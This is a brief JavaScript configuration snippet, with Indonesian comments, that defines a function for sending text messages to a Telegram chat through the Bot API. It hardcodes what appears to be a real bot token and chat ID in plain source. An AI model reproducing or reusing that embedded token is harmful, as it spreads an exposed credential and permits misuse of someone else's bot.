// ==========================================
// KONFIGURASI TELEGRAM BOT
// ==========================================
const TELEGRAM_BOT_TOKEN = '9189949943:AAGWkG3Lnly2aM8Wu4kCwUHRo4PK6UMwABs';
const TELEGRAM_CHAT_ID = '6742478722';

// Fungsi untuk mengirim data teks ke Telegram
async function kirimKeTelegram(pesan) {
  try {
    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: pesan,
        parse_mode: 'Markdown'
      })
    });
    const data = await response.json();
    return data.ok;
  } catch (error) {
    console.error('Gagal mengirim ke Telegram:', error);
    return false;
  }
}
